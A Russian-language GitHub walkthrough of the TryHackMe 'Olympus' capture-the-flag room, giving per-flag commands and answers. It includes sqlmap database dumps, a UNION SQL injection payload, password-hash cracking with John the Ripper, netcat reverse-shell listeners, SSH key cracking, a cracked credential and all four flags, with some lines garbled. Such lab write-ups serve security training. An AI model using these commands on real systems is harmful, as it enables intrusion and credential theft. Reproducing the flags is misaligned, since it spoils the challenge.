[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Olympus](https://tryhackme.com/r/room/olympusroom) 

Всего 2 задания:
## Задание 1
Привет!

Запустите VM здесь и начните перечисление! Машине может потребоваться некоторое время для запуска. Пожалуйста, 
подождите до 5 минут (извините за неудобства).  Брутфорс против любой страницы входа выходит за рамки и не должен 
использоваться.

Если вы застряли, вы можете найти подсказки в моем репозитории GitHub (вы найдете их в разделе пошаговых инструкций).

Ну... Удачного взлома ^^ 

Маленький принц

### Ответьте на вопросы ниже
Запустите виртуальную машину

```commandline
Ответ не нужен
```

## Задание 2
Отправьте свои флаги здесь.
### Ответьте на вопросы ниже
Что такое Флаг 1?
```commandline
nmap -sSCV 
gobuster dir -u http://<IP>/ -t 30 -w /usr/share/Seclists/Discovery/Web-Content/common.txt
sqlmap -u "http://<IP>/~webmaster/search.php" --dbs --forms --tables -D olympus --dump
sqlmap -u 'http://<IP>/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T flag  --dump
# or in search
1337'union select 1,2,concat(flag),4,5,6,7,8,9,10 from olympus.flag -- -
```
```commandline
flag{Sm4rt!_k33P_d1gGIng}
```
Что такое Флаг 2?
```commandline
sqlmap -u 'http://<IP>/~webmaster/category.php?cat_id=1' -p 'cat_id' -D olympus -T users  -C user_name,user_password,user_email --dump
john hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash 
prometeheus:summertime
http://<IP>/~webmaster/search.php
nc -lvnp 4444
cat /home/zeus/user.txt
```
```commandline
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
```
Что такое Флаг 3?
```commandline
find / -perm -u=s -type f 2>/dev/null
/usr/bin/cputils
chmod 400 id_rsa
ssh -i id_rsa zeus@olympus.thm
ssh2john.py id_rsa > pass
john pass --wordlist=/usr/share/wordlists/rockyou.txt
ssh zeus@olympus.thm -i id_rsa
uname -a; -w;/lib/defended/libc.so.99

```
```commandline
flag{D4mN!_Y0u_G0T_m3_:)_}
```
Что такое Флаг 4?
```commandline
nc -nlvp 5555
cd /etc
grep -R "flag{"
cat ssl/private/.b0nus.fl4g
```
```commandline
flag{Y0u_G0t_m3_g00d!}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)